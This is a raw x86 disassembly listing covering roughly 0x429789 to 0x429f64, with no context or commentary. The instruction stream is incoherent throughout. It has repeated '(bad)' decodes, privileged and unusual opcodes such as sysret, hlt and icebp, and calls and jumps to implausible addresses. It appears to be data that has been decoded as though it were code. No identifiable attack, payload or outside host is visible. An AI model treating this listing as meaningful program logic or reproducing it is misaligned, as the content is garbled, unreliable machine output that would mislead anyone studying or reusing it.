  429789:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429790:	push   0xffffff83
  429792:	pop    edi
  429793:	or     BYTE PTR [ebp+0x53],dh
  429796:	xorps  xmm1,xmm2
  429799:	test   BYTE PTR [eax+eax*1],bh
  42979c:	add    BYTE PTR [eax],al
  42979e:	adc    eax,eax
  4297a0:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  4297a8:	jmp    DWORD PTR [eax]
  4297aa:	ror    al,0x5e
  4297ad:	inc    ebp
  4297ae:	leave  
  4297af:	xor    ecx,DWORD PTR [eax]
  4297b1:	and    DWORD PTR [ebx-0x3ec90708],ecx
  4297b7:	add    ch,al
  4297b9:	xor    edi,edi
  4297bb:	xor    DWORD PTR [ebx],0x660033fc
  4297c1:	mov    DWORD PTR [ebp-0xc],ecx
  4297c4:	pcmpgtw mm0,mm0
  4297c7:	add    dl,ah
  4297c9:	leave  
  4297ca:	mov    edi,DWORD PTR [esi-0x7d]
  4297cd:	push   ax
  4297cf:	dec    ebp
  4297d0:	mov    esi,DWORD PTR [ebx-0x75]
  4297d3:	lea    ebp,[eax-0x7c00fffc]
  4297d9:	xor    eax,DWORD PTR [eax]
  4297db:	sysret 
  4297dd:	dec    ebp
  4297de:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  4297e5:	push   WORD PTR [ecx+0x8]
  4297e9:	jne    0x4297ac
  4297eb:	ud0    ecx,DWORD PTR [ecx]
  4297ee:	mov    esi,DWORD PTR [edx]
  4297f0:	lods   al,BYTE PTR ds:[esi]
  4297f1:	add    BYTE PTR [eax],al
  4297f3:	data16 (bad) 
  4297f5:	iret   
  4297f6:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  4297fd:	cli    
  4297fe:	inc    ebp
  4297ff:	cmp    al,0x8d
  429801:	add    BYTE PTR [esi+0x2d],ah
  429804:	inc    ebp
  429805:	pop    ebp
  429806:	lea    ecx,[edi]
  429808:	mov    dl,bh
  42980a:	add    BYTE PTR [edi],cl
  42980c:	mov    DWORD PTR [eax+eax*8],edi
  42980f:	mov    ebx,0x3a87
  429814:	add    BYTE PTR [ebx],ch
  429816:	inc    ebp
  429817:	data16 (bad) 
  429819:	clc    
  42981a:	int3   
  42981b:	cmp    eax,DWORD PTR [eax]
  42981d:	je     0x4297a8
  42981f:	push   0xffffffc8
  429821:	pop    edi
  429822:	xchg   DWORD PTR [ebp+0x0],eax
  429825:	data16 add BYTE PTR [ebp+0x45],cl
  429829:	lea    cx,[ebp+0x10]
  42982d:	jb     0x42982f
  42982f:	jmp    0x4297ba
  429831:	call   eax
  429833:	clc    
  429834:	xchg   DWORD PTR [edi+0x1],edi
  429837:	mov    eax,DWORD PTR [eax]
  429839:	or     BYTE PTR [ebp-0x49],al
  42983c:	lea    eax,[eax+0x74003154]
  429842:	push   edi
  429843:	inc    edx
  429844:	jge    0x429845
  429846:	mov    DWORD PTR [edi],ecx
  429848:	fdiv   DWORD PTR [edi-0x6]
  42984b:	inc    DWORD PTR [eax]
  42984d:	xor    edx,DWORD PTR [eax+0x5f]
  429850:	xchg   DWORD PTR [ebx+0x1],ebx
  429853:	ret    0x0
  429856:	xor    BYTE PTR [ebp-0x51],cl
  429859:	cmp    edi,0xf0ff8904
  42985f:	data16 ror al,0x84
  429863:	rol    BYTE PTR [eax],0x3b
  429866:	add    al,dh
  429868:	dec    eax
  429869:	xchg   esp,eax
  42986a:	push   ebx
  42986b:	jmp    0x4297f8
  42986d:	push   ebp
  42986e:	add    esp,ebp
  429870:	add    ebp,esp
  429872:	mov    edx,DWORD PTR [edi+0x24]
  429875:	clc    
  429876:	dec    esi
  429877:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  42987d:	cmp    BYTE PTR [ebx],al
  42987f:	jne    0x42980a
  429881:	xor    esp,eax
  429883:	jmp    0x459a06
  429888:	add    ebp,DWORD PTR [ecx+ecx*4]
  42988b:	jne    0x429881
  42988d:	call   0xffcc95e7
  429892:	clc    
  429893:	xchg   edi,eax
  429894:	sti    
  429895:	add    DWORD PTR [ebx],eax
  429897:	add    BYTE PTR [ebp+0x47],bl
  42989a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4298a0:	pop    ebp
  4298a1:	mov    DWORD PTR [esi-0x48],esi
  4298a4:	jmp    0x4298ed
  4298a6:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4298ac:	(bad)  
  4298ae:	cmp    al,0x0
  4298b0:	cmp    eax,DWORD PTR [ebp+0x18]
  4298b3:	lea    ebx,[ebp-0x56]
  4298b6:	jle    0x4298b8
  4298b8:	jae    0x429843
  4298ba:	mov    eax,esp
  4298bc:	call   0xb900:0x8b005587
  4298c3:	inc    ebp
  4298c4:	push   ebp
  4298c5:	lea    ecx,[ebp-0x27ff4f12]
  4298cb:	mov    eax,edi
  4298cd:	int3   
  4298ce:	push   ebp
  4298cf:	xchg   edi,eax
  4298d1:	add    esp,ebp
  4298d3:	add    BYTE PTR [eax],al
  4298d5:	inc    ebp
  4298d6:	add    BYTE PTR [ebp+0x8b3255],cl
  4298dc:	cld    
  4298dd:	mov    DWORD PTR [edx],edi
  4298df:	aam    0x75
  4298e1:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  4298e7:	mov    DWORD PTR [ebx-0x50],edx
  4298ea:	test   BYTE PTR [ebp-0x1],0xe8
  4298ee:	mov    eax,DWORD PTR [eax]
  4298f0:	hlt    
  4298f1:	add    al,al
  4298f3:	mov    eax,DWORD PTR ds:0x890045a8
  4298f9:	dec    DWORD PTR [ebx+0x45fdf0e8]
  4298ff:	inc    DWORD PTR [eax*2+0xf75854d]
  429906:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  42990c:	call   0x7298f64d
  429911:	je     0x429971
  429913:	js     0x429974
  429915:	lock ret 0x7e
  429919:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  42991f:	mov    edi,edi
  429921:	sbb    al,bl
  429923:	clc    
  429924:	add    BYTE PTR [ebp-0x73],bh
  429927:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  42992d:	ror    BYTE PTR [eax],1
  42992f:	dec    ebp
  429930:	xchg   ebp,eax
  429931:	mov    edi,edi
  429933:	in     al,0x8b
  429935:	jge    0x4298c0
  429937:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  42993d:	clc    
  42993e:	pop    esi
  42993f:	fist   DWORD PTR [ebp+0x5d398b5d]
  429945:	clc    
  429946:	add    al,0x6e
  429948:	mov    eax,DWORD PTR [ebx]
  42994a:	mov    BYTE PTR [ebp+0x0],dl
  42994d:	mov    edx,DWORD PTR [ebx-0x20]
  429950:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429956:	add    eax,0x3b3a73
  42995b:	adc    al,0x89
  42995d:	pop    eax
  42995e:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429962:	ret    0xf08
  429965:	cmp    al,0x2
  429967:	mov    DWORD PTR [edx],esi
  429969:	cld    
  42996a:	add    BYTE PTR [ebp+0x66],dl
  42996d:	add    eax,ebx
  42996f:	add    esp,eax
  429971:	sub    eax,eax
  429973:	or     BYTE PTR [ecx-0x77f474bb],cl
  429979:	add    BYTE PTR [eax],al
  42997b:	mov    DWORD PTR [ebx-0x24],ebx
  42997e:	push   edi
  42997f:	push   ebp
  429980:	clc    
  429981:	add    DWORD PTR [esi+0x1b0100],0x45
  429988:	out    0xff,eax
  42998a:	add    edx,DWORD PTR [eax]
  42998c:	jmp    0x429976
  42998e:	cmp    ch,0x43
  429991:	(bad)  
  429992:	jmp    0x40c821e4
  429997:	je     0x429923
  429999:	mov    eax,DWORD PTR [eax-0x10c78704]
  42999f:	inc    ebp
  4299a0:	add    BYTE PTR [ebx-0x770375],al
  4299a6:	add    ah,ch
  4299a8:	add    edx,esp
  4299aa:	pop    edi
  4299ab:	pop    ebp
  4299ac:	push   ebp
  4299ad:	inc    ebx
  4299ae:	in     al,dx
  4299af:	pop    ebp
  4299b0:	in     al,dx
  4299b1:	cmp    edx,DWORD PTR [edi-0x8]
  4299b4:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  4299bb:	add    al,0x47
  4299bd:	push   ebp
  4299be:	mov    esp,ebp
  4299c0:	in     al,0x45
  4299c2:	dec    ebp
  4299c3:	push   esi
  4299c4:	test   DWORD PTR [eax+0xff010f],esi
  4299ca:	add    BYTE PTR [eax+0xc018b],dh
  4299d0:	leave  
  4299d1:	inc    ebp
  4299d2:	test   al,ch
  4299d4:	add    dh,bh
  4299d6:	add    bh,bh
  4299d8:	dec    ebp
  4299d9:	push   cs
  4299da:	mov    DWORD PTR [ecx],eax
  4299dc:	hlt    
  4299dd:	push   es
  4299de:	dec    ebp
  4299df:	leave  
  4299e0:	mov    DWORD PTR [eax],ecx
  4299e2:	clc    
  4299e3:	cmovge eax,ecx
  4299e6:	mov    ecx,0x85c2f0
  4299ec:	clc    
  4299ed:	pop    DWORD PTR [ebp+0x1]
  4299f0:	aas    
  4299f1:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  4299f8:	push   esi
  4299f9:	add    BYTE PTR [ebp-0x4],al
  4299fc:	mov    DWORD PTR [eax],eax
  4299fe:	cld    
  4299ff:	inc    bp
  429a01:	add    DWORD PTR [edx],edi
  429a03:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429a0b:	mov    ebx,0xcd4f68
  429a10:	mov    edi,DWORD PTR [ebx]
  429a12:	or     al,0x75
  429a14:	(bad)  
  429a15:	xor    ecx,ebx
  429a17:	enterw 0x4d01,0x87
  429a1c:	jmp    0x429a22
  429a21:	ret    
  429a22:	inc    ebp
  429a23:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429a29:	add    dh,cl
  429a2b:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429a33:	icebp  
  429a34:	or     BYTE PTR [eax+0x8f13bd2],al
  429a3a:	inc    ebp
  429a3b:	inc    edx
  429a3c:	mov    ecx,DWORD PTR [edx]
  429a3e:	or     al,0xf9
  429a40:	(bad)  
  429a41:	jne    0x429a11
  429a43:	mov    cl,0x0
  429a46:	rol    BYTE PTR [esi+0x450134],1
  429a4c:	add    eax,edi
  429a4e:	cld    
  429a4f:	ret    
  429a50:	dec    ebp
  429a51:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429a57:	mov    edi,0xf82c8534
  429a5c:	jmp    0x429adb
  429a5e:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429a64:	mov    dl,0x8b
  429a66:	sub    cl,BYTE PTR [eax]
  429a68:	mov    ecx,ecx
  429a6a:	in     al,dx
  429a6b:	test   cl,dh
  429a6d:	add    BYTE PTR [edx],al
  429a6f:	add    BYTE PTR [eax-0x377a97b3],al
  429a75:	cmovge esi,esp
  429a78:	add    eax,DWORD PTR [eax]
  429a7a:	cld    
  429a7b:	mov    eax,DWORD PTR [ecx]
  429a7d:	adc    BYTE PTR [ebp+0x4d],cl
  429a80:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429a86:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429a8c:	cmp    esp,ebx
  429a8e:	jne    0x429a2c
  429a90:	mov    eax,edi
  429a92:	adc    ah,ch
  429a94:	push   ebp
  429a95:	test   DWORD PTR [ebx],esi
  429a97:	clc    
  429a98:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429a9e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429aa1:	dec    ebp
  429aa2:	adc    bh,al
  429aa4:	push   0x8b85ff10
  429aa9:	clc    
  429aaa:	or     al,0x50
  429aac:	(bad)  
  429aad:	push   ecx
  429aae:	retf   
  429aaf:	mov    ebx,0xff4d8dc8
  429ab4:	mov    DWORD PTR [ebp+0x8],eax
  429ab7:	xor    eax,DWORD PTR [ebp-0x75]
  429aba:	cmp    ebp,DWORD PTR [ebx]
  429abc:	lsl    ebx,WORD PTR [edi-0x8]
  429ac0:	call   DWORD PTR [ebx-0x741bff75]
  429ac6:	(bad)  
  429ac7:	or     al,0x5b
  429ac9:	dec    ebp
  429aca:	or     BYTE PTR [ebx],dh
  429acc:	inc    ebp
  429acd:	xor    esi,DWORD PTR ds:0x708088d
  429ad3:	in     eax,0x98
  429ad5:	add    BYTE PTR [edx],dh
  429ad7:	inc    ebp
  429ad8:	pop    edi
  429ad9:	xor    eax,edx
  429adb:	test   DWORD PTR [eax],0x81108b8b
  429ae1:	dec    ebp
  429ae2:	sub    al,0x33
  429ae4:	add    BYTE PTR [ebx],dh
  429ae6:	push   esi
  429ae7:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429aed:	mov    edi,eax
  429aef:	or     BYTE PTR [ebp+0x45],al
  429af2:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429af8:	cmp    cl,cl
  429afa:	pushf  
  429afb:	push   es
  429afc:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429b03:	dec    ebp
  429b04:	inc    ebp
  429b05:	and    BYTE PTR [eax],0x50
  429b08:	pushf  
  429b09:	push   0x4de4d1c7
  429b0e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429b14:	fsubr  st,st(1)
  429b16:	xlat   BYTE PTR ds:[ebx]
  429b17:	rol    bh,cl
  429b19:	mov    edx,esp
  429b1b:	or     BYTE PTR [ebp+0x4588f84d],al
  429b21:	mov    ecx,DWORD PTR [eax]
  429b23:	or     BYTE PTR [eax],al
  429b25:	push   ebp
  429b26:	mov    edi,DWORD PTR [eax+0xfc728b]
  429b2c:	dec    ebp
  429b2d:	enter  0xceba,0x8
  429b31:	retf   0x1807
  429b34:	ret    0x984d
  429b37:	mov    esi,DWORD PTR [edx]
  429b39:	or     al,0x33
  429b3b:	into   
  429b3c:	add    edx,esi
  429b3e:	add    ecx,edx
  429b40:	bswap  eax
  429b42:	ror    esi,0x98
  429b45:	dec    ebp
  429b46:	add    cl,ch
  429b48:	mov    edi,edi
  429b4a:	hlt    
  429b4b:	inc    esi
  429b4d:	inc    ebp
  429b4e:	ret    0x4533
  429b51:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429b57:	or     BYTE PTR [ebx],dh
  429b59:	dec    ebp
  429b5a:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429b60:	jne    0xff8c9b27
  429b66:	inc    ebp
  429b67:	inc    ebp
  429b68:	mov    esi,DWORD PTR [ebx]
  429b6a:	clc    
  429b6b:	pop    esi
  429b6c:	ret    0xcaeb
  429b6f:	mov    eax,esi
  429b71:	call   0x5203ec44
  429b76:	dec    ebp
  429b77:	add    eax,0xf8728b
  429b7c:	adc    eax,0xce0ccac9
  429b81:	push   ebp
  429b82:	ret    0xc6ec
  429b85:	in     al,dx
  429b86:	call   0x3342e88f
  429b8b:	push   edi
  429b8c:	add    edi,eax
  429b8e:	xor    eax,eax
  429b90:	jmp    0x429bd7
  429b92:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  429b98:	add    eax,edi
  429b9a:	shr    eax,cl
  429b9c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  429ba2:	mov    edi,DWORD PTR [ecx]
  429ba4:	in     al,dx
  429ba5:	pushf  
  429ba6:	ret    0x84c7
  429ba9:	fcomp  DWORD PTR [eax-0x7607cd7b]
  429baf:	inc    ebp
  429bb0:	in     al,dx
  429bb1:	cmp    BYTE PTR [ebp-0x64],al
  429bb4:	mov    eax,edi
  429bb6:	cld    
  429bb7:	fmul   st(2),st
  429bb9:	sbb    dl,al
  429bbb:	jmp    0x9c3b:0x374d45c1
  429bc2:	jbe    0x429b8b
  429bc4:	mov    esp,eax
  429bc6:	clc    
  429bc7:	add    BYTE PTR [ebp+0x0],cl
  429bca:	mov    ecx,ecx
  429bcc:	lea    eax,[ebp-0x5]
  429bcf:	mov    edi,edi
  429bd1:	call   0x51cdec1b
  429bd6:	hlt    
  429bd7:	xor    eax,edx
  429bd9:	mov    esi,0x987284
  429bde:	xor    cl,dl
  429be0:	mov    esi,eax
  429be2:	hlt    
  429be3:	into   
  429be4:	inc    ebp
  429be5:	scas   eax,DWORD PTR es:[edi]
  429be6:	mov    ebp,ecx
  429be8:	cld    
  429be9:	add    dl,cl
  429beb:	add    dl,al
  429bed:	inc    ebp
  429bee:	shr    DWORD PTR [ebx],0x4d
  429bf1:	xor    edi,DWORD PTR [ebx]
  429bf3:	mov    DWORD PTR [edi],ecx
  429bf5:	clc    
  429bf6:	dec    esi
  429bf7:	inc    ebp
  429bf8:	dec    DWORD PTR [ebx-0x3d2b1775]
  429bfe:	ret    0xc6ca
  429c01:	mov    BYTE PTR [ebp-0x32],0x53
  429c05:	scas   eax,DWORD PTR es:[edi]
  429c06:	inc    ebp
  429c07:	jmp    0x429c40
  429c09:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  429c10:	pop    ebx
  429c11:	xor    ecx,DWORD PTR [ebp+0x3]
  429c14:	mov    eax,DWORD PTR [ebx]
  429c16:	clc    
  429c17:	test   edx,ecx
  429c19:	mov    ecx,esi
  429c1b:	cld    
  429c1c:	call   0x8ab6e166
  429c21:	xor    ecx,DWORD PTR [eax+0x4533f303]
  429c27:	add    ecx,DWORD PTR [ebx-0x4974072d]
  429c2d:	fdiv   QWORD PTR [ebx]
  429c2f:	retf   0xce89
  429c32:	in     al,0xc1
  429c34:	inc    ebp
  429c35:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  429c3b:	into   
  429c3c:	mov    dh,0xc1
  429c3f:	call   0x8c16e1c8
  429c44:	(bad)  
  429c45:	cld    
  429c46:	mov    ecx,DWORD PTR [ebp-0x14]
  429c49:	xor    eax,ecx
  429c4b:	lea    eax,[ebp+0x8]
  429c4e:	mov    esi,DWORD PTR [edx-0x4]
  429c51:	add    dl,al
  429c53:	inc    ebp
  429c54:	mov    esp,0x32d8988b
  429c59:	dec    ebp
  429c5a:	mov    esi,DWORD PTR [ebx]
  429c5c:	cld    
  429c5d:	xor    eax,edx
  429c5f:	sub    ebp,DWORD PTR [eax-0x75]
  429c62:	int    0xec
  429c64:	sub    ecx,eax
  429c66:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  429c6c:	mov    esi,esp
  429c6e:	call   0x3416e9f7
  429c73:	inc    DWORD PTR [ebx]
  429c75:	mov    edi,DWORD PTR [ebx]
  429c77:	cld    
  429c78:	jne    0x429cc7
  429c7a:	mov    esi,DWORD PTR [ebx]
  429c7c:	aam    0x8d
  429c7e:	dec    ebp
  429c7f:	or     BYTE PTR [ebx],dh
  429c81:	jb     0x429c86
  429c83:	add    BYTE PTR [edi+0x45],bl
  429c86:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  429c8d:	xor    ebp,esp
  429c8f:	xor    eax,edi
  429c91:	sub    edi,esp
  429c93:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  429c99:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  429ca0:	inc    ebp
  429ca1:	xor    ecx,DWORD PTR [ecx+0x45891403]
  429ca7:	clc    
  429ca8:	mov    eax,edi
  429caa:	nop
  429cab:	fadd   QWORD PTR [eax]
  429cad:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  429cb3:	jmp    0x429c3e
  429cb5:	mov    eax,DWORD PTR [ecx]
  429cb7:	fadd   DWORD PTR [eax]
  429cb9:	inc    ebp
  429cba:	or     DWORD PTR [ebx],esi
  429cbc:	dec    eax
  429cbd:	add    edx,DWORD PTR [ebx-0x2d]
  429cc0:	dec    ebp
  429cc1:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  429cc7:	inc    ebp
  429cc8:	push   eax
  429cc9:	mov    dl,BYTE PTR [ecx-0xd]
  429ccc:	xor    ecx,DWORD PTR [ebp-0x45]
  429ccf:	(bad)  
  429cd1:	rol    BYTE PTR [eax],0xc1
  429cd4:	ret    
  429cd5:	inc    ebp
  429cd6:	inc    ebp
  429cd7:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  429cdd:	xor    eax,ebx
  429cdf:	add    eax,DWORD PTR [ebp+0x23]
  429ce2:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  429ce8:	cmp    edi,0xc
  429ceb:	dec    ebp
  429cec:	inc    ebp
  429ced:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  429cf3:	inc    ebp
  429cf4:	mov    esi,DWORD PTR [ebx]
  429cf6:	clc    
  429cf7:	lea    eax,[ebp+0x45725407]
  429cfd:	add    BYTE PTR [ebp+eax*2-0x75],dh
  429d01:	xor    edi,DWORD PTR [eax]
  429d03:	mov    ecx,0xff8b8d4d
  429d08:	push   esp
  429d09:	enter  0x4df7,0x23
  429d0d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  429d13:	mov    eax,DWORD PTR [ebx]
  429d15:	loopne 0x429d02
  429d17:	ret    0xc68b
  429d1a:	push   esp
  429d1b:	enter  0x9745,0x8b
  429d1f:	inc    ebp
  429d20:	cld    
  429d21:	mov    eax,edi
  429d23:	clc    
  429d24:	ret    
  429d25:	ret    0xc645
  429d28:	mov    esi,DWORD PTR [ebx]
  429d2a:	cld    
  429d2b:	pop    esi
  429d2c:	mov    ebx,0x83458bc3
  429d32:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  429d36:	dec    ebp
  429d37:	cmp    BYTE PTR [ebx],dh
  429d39:	pushf  
  429d3a:	add    edi,DWORD PTR [edx-0x7767a77]
  429d40:	fcom   DWORD PTR [ebp+0x45]
  429d43:	mov    edi,DWORD PTR [edx]
  429d45:	adc    al,0x9c
  429d47:	inc    ebp
  429d48:	(bad)  
  429d49:	mov    ebx,eax
  429d4b:	adc    al,0x85
  429d4d:	cmp    al,0x1
  429d50:	inc    ebp
  429d51:	add    BYTE PTR [ecx*2-0x74167464],bh
  429d58:	add    edx,DWORD PTR [eax-0x74bb0000]
  429d5e:	xor    eax,DWORD PTR [ebx]
  429d60:	add    edi,DWORD PTR [ecx+ecx*4]
  429d63:	mov    esp,esi
  429d65:	clc    
  429d66:	inc    ebp
  429d67:	inc    ebp
  429d68:	add    edx,DWORD PTR [esi+0xc]
  429d6b:	mov    edi,0x7ff0845
  429d70:	in     al,dx
  429d71:	(bad)  
  429d72:	jne    0x429d0c
  429d74:	mov    esi,DWORD PTR [edx]
  429d76:	clc    
  429d77:	add    ebp,DWORD PTR [edx]
  429d79:	mov    edi,edi
  429d7b:	in     al,dx
  429d7c:	mov    DWORD PTR [ebp-0x10],eax
  429d7f:	xor    eax,DWORD PTR [ebp+0x3]
  429d82:	and    BYTE PTR [ecx+0x458bf49c],cl
  429d88:	fmul   DWORD PTR [ebx-0x173caf39]
  429d8e:	lea    ecx,[ecx+0x45e8d4bc]
  429d94:	clc    
  429d95:	mov    edi,edi
  429d97:	cmp    BYTE PTR [ebp+0x4d],al
  429d9a:	test   DWORD PTR [eax+0x74],ecx
  429d9d:	inc    ecx
  429d9e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  429da4:	ret    
  429da5:	inc    eax
  429da6:	dec    DWORD PTR [ebx+0x4945f8f0]
  429dac:	push   eax
  429dad:	dec    eax
  429dae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429daf:	sar    bh,1
  429db1:	enter  0x458b,0xec
  429db5:	mov    eax,DWORD PTR [ebp+0x38]
  429db8:	mov    eax,ecx
  429dba:	fadd   DWORD PTR [ebx]
  429dbc:	dec    ebp
  429dbd:	inc    eax
  429dbe:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  429dc4:	inc    ebp
  429dc5:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  429dcb:	fadd   QWORD PTR [ebx]
  429dcd:	inc    ebp
  429dce:	or     al,0x33
  429dd0:	dec    ebp
  429dd1:	add    edi,DWORD PTR [ebx]
  429dd3:	mov    DWORD PTR [edx-0x28],esi
  429dd6:	mov    eax,DWORD PTR [ebp-0x10]
  429dd9:	mov    eax,DWORD PTR [eax+0x10]
  429ddc:	mov    eax,edi
  429dde:	lock ret 
  429de0:	inc    ecx
  429de1:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  429de7:	fsubr  st,st(5)
  429de9:	test   DWORD PTR [eax],eax
  429deb:	clc    
  429dec:	push   0x45
  429dee:	(bad)  
  429def:	cmp    ebp,esp
  429df1:	pushf  
  429df2:	inc    ebp
  429df3:	(bad)  
  429df4:	push   eax
  429df5:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  429df9:	clc    
  429dfa:	mov    eax,0xf8008584
  429dff:	mov    eax,DWORD PTR [ebp-0x4]
  429e02:	mov    edi,0x4585c3cc
  429e08:	clc    
  429e09:	mov    eax,DWORD PTR [ebp+0x14]
  429e0c:	cmp    al,BYTE PTR [ebp-0x64]
  429e0f:	mov    edi,eax
  429e11:	in     al,dx
  429e12:	les    esi,FWORD PTR [ebp-0x7b]
  429e15:	mov    edi,eax
  429e17:	or     al,0x4d
  429e19:	dec    ebp
  429e1a:	mov    eax,ebp
  429e1c:	in     al,0xf2
  429e1e:	dec    ebp
  429e1f:	dec    DWORD PTR [ecx+0x4dc7e045]
  429e25:	fmul   DWORD PTR [ecx+0x4df8f085]
  429e2b:	inc    ebp
  429e2c:	mov    DWORD PTR [ebx],esi
  429e2e:	fadd   QWORD PTR [ebx]
  429e30:	dec    ebp
  429e31:	push   eax
  429e32:	xor    eax,DWORD PTR [ebp+0x3]
  429e35:	push   eax
  429e36:	mov    DWORD PTR [eax],ebx
  429e38:	fdivr  st,st(7)
  429e3a:	test   BYTE PTR [ebx-0x3fc21000],0x85
  429e41:	dec    esi
  429e42:	clc    
  429e43:	inc    ebp
  429e44:	test   BYTE PTR [ebx],dh
  429e46:	add    DWORD PTR [ebx],eax
  429e48:	add    BYTE PTR [eax+0x4d],dl
  429e4b:	jne    0x429e80
  429e4d:	lea    ecx,[ebx-0x7617fc44]
  429e53:	div    ah
  429e55:	inc    DWORD PTR [ebp+0x45]
  429e58:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  429e5e:	jb     0x429deb
  429e60:	add    BYTE PTR [eax*2-0x17ba743f],cl
  429e67:	mov    ecx,DWORD PTR [ebp-0x10]
  429e6a:	xor    ecx,DWORD PTR [ebp+0x3]
  429e6d:	mov    edi,DWORD PTR [ebx]
  429e6f:	adc    BYTE PTR [ebp+0x41],dh
  429e72:	mov    ecx,DWORD PTR [ebx-0x37382704]
  429e78:	ret    
  429e79:	push   ss
  429e7a:	push   0x45
  429e7c:	lea    ecx,[ebx+0x4de80cb0]
  429e82:	sti    
  429e83:	add    edi,edi
  429e85:	or     BYTE PTR [ebp+0x4d],al
  429e88:	mov    ebp,DWORD PTR [ebx]
  429e8a:	xor    ebp,ecx
  429e8c:	mov    al,BYTE PTR [edx]
  429e8e:	add    eax,0xc7200
  429e93:	jne    0x429ee2
  429e95:	lea    esi,[ebx]
  429e97:	mov    al,0xf
  429e99:	call   0xe955e
  429e9e:	sar    DWORD PTR [eax],0x84
  429ea1:	pushf  
  429ea2:	add    DWORD PTR [ecx+0x4545d000],ecx
  429ea8:	mov    edi,DWORD PTR [ecx]
  429eaa:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  429eb1:	test   DWORD PTR [eax],eax
  429eb3:	clc    
  429eb4:	dec    ebp
  429eb5:	inc    ebp
  429eb6:	xor    edi,DWORD PTR [ebx]
  429eb8:	setl   al
  429ebb:	(bad)  
  429ebc:	retf   
  429ebd:	rol    cl,1
  429ebf:	dec    ebp
  429ec0:	test   BYTE PTR [ebp+0x4d00cc01],cl
  429ec6:	inc    ebp
  429ec7:	lea    ecx,[ebx-0x75b2cc38]
  429ecd:	lea    eax,ds:0x4d72c4
  429ed3:	mov    ecx,DWORD PTR [ebp-0x4]
  429ed6:	xor    ecx,edi
  429ed8:	bswap  ebx
  429eda:	ror    BYTE PTR [ebp-0x35],0xe9
  429ede:	rol    DWORD PTR [ecx],0x84
  429ee1:	add    BYTE PTR [ecx],al
  429ee3:	cmp    al,BYTE PTR [eax]
  429ee5:	pushf  
  429ee6:	inc    ebp
  429ee7:	jnp    0x8a42d2ea
  429eed:	mov    eax,DWORD PTR ds:0xcf72e8
  429ef3:	lock dec ebp
  429ef5:	retf   
  429ef6:	xor    ecx,DWORD PTR [ebp+0xf]
  429ef9:	mov    eax,eax
  429efb:	fmul   st,st(3)
  429efd:	test   ecx,0x1988484
  429f03:	xor    al,BYTE PTR [eax]
  429f05:	mov    DWORD PTR [ebp-0x28],eax
  429f08:	mov    eax,DWORD PTR [ebp+0x33]
  429f0b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  429f11:	ret    
  429f12:	add    al,cl
  429f14:	dec    ebp
  429f15:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  429f1b:	add    ecx,DWORD PTR ds:0xc7250
  429f21:	inc    ebp
  429f22:	rcl    DWORD PTR [eax+0x4d],0x27
  429f26:	mov    edi,edi
  429f28:	xor    ecx,DWORD PTR [ebx+0xde48a]
  429f2e:	jb     0x429ef7
  429f30:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  429f37:	mov    esi,DWORD PTR [ebx]
  429f39:	cld    
  429f3a:	mov    cl,bh
  429f3c:	or     eax,0x372b6
  429f41:	cmp    ecx,eax
  429f43:	jne    0x429fc0
  429f49:	mov    eax,DWORD PTR [ebp-0x20]
  429f4c:	mov    eax,DWORD PTR [eax]
  429f4e:	xor    eax,edi
  429f50:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  429f57:	mov    ecx,DWORD PTR [ebp-0x4]
  429f5a:	mov    ecx,edi
  429f5c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  429f62:	jb     0x429f73
  429f64:	add    BYTE PTR [edi-0x3f],dl
